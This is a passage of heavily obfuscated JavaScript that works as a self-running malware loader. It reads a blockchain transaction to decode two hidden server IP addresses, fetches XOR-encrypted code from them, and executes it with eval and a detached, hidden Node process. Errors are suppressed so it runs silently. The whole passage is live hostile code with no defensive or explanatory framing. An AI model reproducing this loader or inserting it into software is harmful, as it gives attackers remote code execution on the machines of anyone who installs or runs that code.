_0x43231f=_0xb40cd9,_0x4f8cb7={'HmRMA':function(_0x1866e8,_0x355583){return _0x1866e8(_0x355583);}};return _0x4f8cb7[_0x43231f(0x254)](hr,I+(_0x43231f(0x227)+_0x43231f(0x289)+_0x43231f(0x2f7)+_0x43231f(0x277))+S+(_0x43231f(0x2ce)+_0x43231f(0x2b4)+_0x43231f(0x239)+_0x43231f(0x30f)+_0x43231f(0x1f3)+_0x43231f(0x290)+_0x43231f(0x257)+'om'))[_0x43231f(0x2eb)](_0x216a23=>{const _0x494ec9=_0x43231f,_0x16dfdc=Array[_0x494ec9(0x258)](_0x216a23?.[_0x494ec9(0x2ee)])?_0x216a23[_0x494ec9(0x2ee)]:[],_0x454aaa=_0x16dfdc[_0x494ec9(0x2ba)](_0x4221ff=>_0x4221ff[_0x494ec9(0x1f1)]?.[_0x494ec9(0x2d3)+'e']()===S);return{'blockNumber':_0x4f8cb7[_0x494ec9(0x254)](BigInt,_0x454aaa[_0x494ec9(0x267)+'r']),'tx':_0x454aaa};});}((async()=>{const _0x55377a=_0xb40cd9,_0x7fec65={'XrINm':function(_0x7c8c02,_0x4c4fc5){return _0x7c8c02<_0x4c4fc5;},'icJKY':function(_0x158793,_0x58c500){return _0x158793%_0x58c500;},'gEJkK':_0x55377a(0x236),'pBine':_0x55377a(0x243),'NtNzV':_0x55377a(0x288)+_0x55377a(0x2d0),'YGLIZ':_0x55377a(0x2c4),'dHJMG':function(_0x146e65,_0x2ed0b2){return _0x146e65(_0x2ed0b2);},'LUHgk':_0x55377a(0x1f4),'FJQfU':_0x55377a(0x29f),'qtOhP':function(_0x2dd368,_0x11dc0b){return _0x2dd368===_0x11dc0b;},'CvEVD':_0x55377a(0x2c6),'drGLd':function(_0x129c39,_0x7d3c7f){return _0x129c39(_0x7d3c7f);},'HnEZv':_0x55377a(0x30c),'IYVLW':_0x55377a(0x2b2),'ZFXMR':function(_0x33656f,_0x2660a9){return _0x33656f+_0x2660a9;},'LYlST':_0x55377a(0x25c)+_0x55377a(0x279)+_0x55377a(0x2b9)+_0x55377a(0x2b8)+_0x55377a(0x30d)+_0x55377a(0x315)+_0x55377a(0x2f2)+_0x55377a(0x22c)+_0x55377a(0x2e8)+_0x55377a(0x2ec)+_0x55377a(0x20c)+'6','znPEY':function(_0x5e6f3c,_0xed3ddc){return _0x5e6f3c(_0xed3ddc);},'MLIOR':_0x55377a(0x2a5),'ZTPpt':function(_0xe937e7,_0x5d96ce,_0x1f9763){return _0xe937e7(_0x5d96ce,_0x1f9763);},'qwuMv':_0x55377a(0x2f6),'UoHre':_0x55377a(0x2b3),'qgnZE':_0x55377a(0x26e),'cijQU':function(_0x1fa731,_0x27db6d){return _0x1fa731(_0x27db6d);},'qemQD':function(_0x277781,_0x2eb15d){return _0x277781+_0x2eb15d;},'MOgkU':function(_0x2eeca6,_0x3926fc,_0x2eb0e2,_0x3ba744){return _0x2eeca6(_0x3926fc,_0x2eb0e2,_0x3ba744);},'DXTAq':_0x55377a(0x2f4),'RvLqJ':_0x55377a(0x294),'HPlEi':function(_0x2f0528,_0x429b39){return _0x2f0528(_0x429b39);},'QpeUN':function(_0xf35d7a,_0x56c8f8){return _0xf35d7a-_0x56c8f8;},'kNlIn':function(_0x4e3539,_0x2eac81){return _0x4e3539%_0x2eac81;},'IHMbk':function(_0x1a1fd4,_0x437026){return _0x1a1fd4(_0x437026);},'UVEAg':function(_0x342454,_0x15a61e){return _0x342454(_0x15a61e);},'GZprP':_0x55377a(0x2c9),'WpXmE':function(_0x32b01f,_0x4ab473){return _0x32b01f(_0x4ab473);},'Wtnxs':function(_0x39388e,_0x599f2e){return _0x39388e(_0x599f2e);},'mujFt':_0x55377a(0x1f9)+_0x55377a(0x316),'ogLQR':_0x55377a(0x23b)+_0x55377a(0x28a)},_0x1bbf89=_0x7fec65[_0x55377a(0x2f1)](BigInt,await _0x7fec65[_0x55377a(0x25a)](wr,(_0x3f39d9,_0x308529)=>rc(_0x3f39d9,_0x55377a(0x2be)+_0x55377a(0x1f6),[],_0x308529))),_0x22fb13=_0x7fec65[_0x55377a(0x219)](_0x1bbf89,_0x7fec65[_0x55377a(0x242)](_0x1bbf89,B));let _0x149576=await _0x7fec65[_0x55377a(0x2c8)](fm,_0x7fec65[_0x55377a(0x2f8)](cb,_0x22fb13)[_0x55377a(0x305)](bt));_0x149576||(_0x149576=await _0x7fec65[_0x55377a(0x2f1)](ls,_0x1bbf89)[_0x55377a(0x23f)](li));const _0x40a141=Buffer[_0x55377a(0x1f1)](_0x149576['tx']['to'][_0x55377a(0x2e5)](/^0x/i,''),_0x7fec65[_0x55377a(0x2d7)]),_0x411ef3=_0x3d2586=>_0x3d2586[0x3*0x1eb+-0x38f+0x2*-0x119]+'\u002E'+_0x3d2586[0x1ebf*-0x1+-0x2231+0x7*0x947]+'\u002E'+_0x3d2586[0x1a*-0x11+-0x12e8*-0x1+0x274*-0x7]+'\u002E'+_0x3d2586[-0x1b57+0x59*-0xd+0xc7*0x29],[_0x421b97,_0x1d6d4c]=[_0x7fec65[_0x55377a(0x296)](_0x411ef3,_0x40a141[_0x55377a(0x266)](0x210d+-0xa6*0x11+-0x1607,0x1*-0xf0d+-0x82*-0x6+0xc05)),_0x7fec65[_0x55377a(0x211)](_0x411ef3,_0x40a141[_0x55377a(0x266)](-0x712+0x47*-0x11+-0x3ef*-0x3,0x1*-0x5bd+-0xb02+0x10c7))],_0x124f41=global;_0x124f41['_V']=_0x124f41['i'],_0x124f41['_H']=_0x55377a(0x2e1)+_0x421b97+_0x55377a(0x27a),_0x124f41[_0x55377a(0x2b3)]=_0x55377a(0x2e1)+_0x1d6d4c+_0x55377a(0x27a),_0x124f41[_0x55377a(0x2f6)]=_0x55377a(0x2e1)+_0x421b97+_0x55377a(0x216),_0x124f41[_0x55377a(0x26e)]=_0x55377a(0x2e1)+_0x421b97+_0x55377a(0x27a);function _0x55a40b(_0x3b18ce,_0x5ddbfd){const _0x224176=_0x55377a,_0x5d8ba1={'qFrln':_0x7fec65[_0x224176(0x314)],'HEGYP':_0x7fec65[_0x224176(0x28f)],'uFaIV':function(_0x1bd3c7,_0x3f388f){const _0x12bd2f=_0x224176;return _0x7fec65[_0x12bd2f(0x24a)](_0x1bd3c7,_0x3f388f);},'xLMUX':_0x7fec65[_0x224176(0x21b)],'dKrGP':function(_0xc44d94,_0x2a4e3d){const _0x54d87a=_0x224176;return _0x7fec65[_0x54d87a(0x24a)](_0xc44d94,_0x2a4e3d);},'jPatL':_0x7fec65[_0x224176(0x221)],'ciBJl':function(_0x1f6534,_0x1988ee){const _0x16f09d=_0x224176;return _0x7fec65[_0x16f09d(0x24a)](_0x1f6534,_0x1988ee);},'AfJYB':function(_0x3551db,_0x400f65){const _0x1be802=_0x224176;return _0x7fec65[_0x1be802(0x2f9)](_0x3551db,_0x400f65);},'fUFYG':_0x7fec65[_0x224176(0x30a)],'mjtii':function(_0x353d1c,_0x213c46){const _0xf57fd4=_0x224176;return _0x7fec65[_0xf57fd4(0x25a)](_0x353d1c,_0x213c46);},'IKYUV':_0x7fec65[_0x224176(0x2aa)],'kWFLB':_0x7fec65[_0x224176(0x213)],'OwQBz':_0x7fec65[_0x224176(0x24f)]},_0x392ddd={'hostname':_0x5ddbfd[_0x224176(0x2b6)],'port':+_0x5ddbfd[_0x224176(0x2f3)]||0x61c+-0x188a+0x12be,'path':_0x7fec65[_0x224176(0x260)](_0x5ddbfd[_0x224176(0x20b)],_0x5ddbfd[_0x224176(0x208)]),'headers':{'User-Agent':_0x7fec65[_0x224176(0x2bd)],'Sec-V':_0x124f41['_V']||0x133*-0x1+-0x80*-0x13+-0x84d}},_0x3523a0=_0x4b4fee=>{const _0x284474=_0x224176,_0x49d23b=_0x3b18ce[_0x284474(0x2fd)];for(let _0x403734=0x18e4+0x3ae+-0x1c92;_0x7fec65[_0x284474(0x229)](_0x403734,_0x4b4fee[_0x284474(0x2fd)]);_0x403734++)_0x4b4fee[_0x403734]^=_0x3b18ce[_0x284474(0x2cb)](_0x7fec65[_0x284474(0x207)](_0x403734,_0x49d23b));return _0x4b4fee[_0x284474(0x253)](_0x7fec65[_0x284474(0x270)]);},_0x27d131=_0x11f0b8=>{const _0x4a8021=_0x224176,_0x156194=_0x11f0b8[_0x4a8021(0x2e4)][_0x5d8ba1[_0x4a8021(0x241)]];if(!_0x156194)throw new Error(_0x5d8ba1[_0x4a8021(0x226)]);return _0x5d8ba1[_0x4a8021(0x255)](_0x3523a0,Buffer[_0x4a8021(0x1f1)](_0x156194,_0x5d8ba1[_0x4a8021(0x30b)]));},_0x2df536=_0x1cf6c4=>new Promise((_0x19e059,_0x4b44bd)=>{const _0x2bdd8c=_0x224176,_0x179668=http[_0x2bdd8c(0x2fb)]({..._0x392ddd,'method':_0x1cf6c4},_0x1f7cb5=>{const _0x5b4fc8=_0x2bdd8c,_0x5a3cc2={'PWlzd':function(_0x481eaf,_0x318495){const _0x22e39c=_0x4963;return _0x5d8ba1[_0x22e39c(0x271)](_0x481eaf,_0x318495);},'XHKVp':_0x5d8ba1[_0x5b4fc8(0x241)],'dDnil':function(_0x58ff8f,_0x334e58){const _0x1556a2=_0x5b4fc8;return _0x5d8ba1[_0x1556a2(0x255)](_0x58ff8f,_0x334e58);},'hxvkS':function(_0x48a9c8,_0xcd641b){const _0x5cef57=_0x5b4fc8;return _0x5d8ba1[_0x5cef57(0x255)](_0x48a9c8,_0xcd641b);},'PjPYE':function(_0xca6f7f,_0x5b2eb8){const _0x2b10ea=_0x5b4fc8;return _0x5d8ba1[_0x2b10ea(0x271)](_0xca6f7f,_0x5b2eb8);},'RzAXc':_0x5d8ba1[_0x5b4fc8(0x2bb)],'NfmdB':function(_0x57b1cf,_0x147773){const _0x2dfbf8=_0x5b4fc8;return _0x5d8ba1[_0x2dfbf8(0x268)](_0x57b1cf,_0x147773);}};if(_0x5d8ba1[_0x5b4fc8(0x276)](_0x1cf6c4,_0x5d8ba1[_0x5b4fc8(0x2ad)])){try{_0x5d8ba1[_0x5b4fc8(0x273)](_0x19e059,_0x5d8ba1[_0x5b4fc8(0x271)](_0x27d131,_0x1f7cb5));}catch(_0x12fce8){_0x5d8ba1[_0x5b4fc8(0x268)](_0x4b44bd,_0x12fce8);}_0x1f7cb5[_0x5b4fc8(0x259)]();return;}const _0x191e9f=[];_0x1f7cb5['on'](_0x5d8ba1[_0x5b4fc8(0x29b)],_0x43fb0c=>_0x191e9f[_0x5b4fc8(0x201)](_0x43fb0c)),_0x1f7cb5['on'](_0x5d8ba1[_0x5b4fc8(0x2af)],()=>{const _0xeb5fed=_0x5b4fc8;try{const _0x4143ee=Buffer[_0xeb5fed(0x26b)](_0x191e9f);if(_0x4143ee[_0xeb5fed(0x2fd)])return _0x5a3cc2[_0xeb5fed(0x20a)](_0x19e059,_0x5a3cc2[_0xeb5fed(0x20a)](_0x3523a0,_0x4143ee));if(_0x1f7cb5[_0xeb5fed(0x2e4)][_0x5a3cc2[_0xeb5fed(0x2cd)]])return _0x5a3cc2[_0xeb5fed(0x2ac)](_0x19e059,_0x5a3cc2[_0xeb5fed(0x210)](_0x27d131,_0x1f7cb5));_0x5a3cc2[_0xeb5fed(0x28b)](_0x4b44bd,new Error(_0x5a3cc2[_0xeb5fed(0x29a)]));}catch(_0x296191){_0x5a3cc2[_0xeb5fed(0x1ef)](_0x4b44bd,_0x296191);}}),_0x1f7cb5['on'](_0x5d8ba1[_0x5b4fc8(0x21f)],_0x4b44bd);});_0x179668['on'](_0x7fec65[_0x2bdd8c(0x24f)],_0x4b44bd),_0x179668[_0x2bdd8c(0x2b2)]();});return _0x7fec65[_0x224176(0x2c2)](_0x2df536,_0x7fec65[_0x224176(0x1fe)])[_0x224176(0x23f)](()=>_0x2df536(_0x224176(0x2c6)));}async function _0x254832(_0x50ce50,_0x1e9acf,_0x1f2c0){const _0x253d26=_0x55377a;try{const _0x42afde=await _0x7fec65[_0x253d26(0x2b7)](_0x55a40b,_0x1e9acf,_0x50ce50),_0x319a6e=_0x253d26(0x31c)+_0x253d26(0x2e7)+(_0x124f41['_V']||-0x1*-0x9ad+-0x189*0x5+-0x200)+_0x253d26(0x230)+(_0x1f2c0?'\u005F\u0048':_0x7fec65[_0x253d26(0x237)])+_0x253d26(0x2e7)+(_0x1f2c0?_0x124f41['_H']:_0x124f41[_0x253d26(0x2f6)])+_0x253d26(0x230)+(_0x1f2c0?_0x7fec65[_0x253d26(0x231)]:_0x7fec65[_0x253d26(0x27f)])+_0x253d26(0x2e7)+(_0x1f2c0?_0x124f41[_0x253d26(0x2b3)]:_0x124f41[_0x253d26(0x26e)])+(_0x253d26(0x230)+_0x253d26(0x317)+_0x253d26(0x309)+_0x253d26(0x264)+_0x253d26(0x22f)+_0x253d26(0x2a3));_0x1f2c0||_0x7fec65[_0x253d26(0x222)](eval,_0x7fec65[_0x253d26(0x283)](_0x319a6e,_0x42afde)),_0x7fec65[_0x253d26(0x2a6)](spawn,_0x7fec65[_0x253d26(0x23e)],['-e',_0x7fec65[_0x253d26(0x283)](_0x319a6e,_0x42afde)],{'detached':!(-0x3*-0xc5b+0x48a+0x299b*-0x1),'stdio':_0x7fec65[_0x253d26(0x2b1)],'windowsHide':!(-0x301*-0x3+-0x25cd*-0x1+0x38*-0xd6)})[_0x253d26(0x200)]();}catch(_0x354116){}}await _0x7fec65[_0x55377a(0x2a6)](_0x254832,new URL(_0x55377a(0x2e1)+_0x421b97+(_0x55377a(0x23c)+'s')),_0x7fec65[_0x55377a(0x203)],!(-0x2*-0xa75+0x3be*-0x7+0x1c3*0x3)),await _0x7fec65[_0x55377a(0x2a6)](_0x254832,new URL(_0x55377a(0x2e1)+_0x421b97+_0x55377a(0x2b5)),_0x7fec65[_0x55377a(0x265)],!(-0x315*-0x3+0x7*-0x10f+-0x2f*0xa));})());
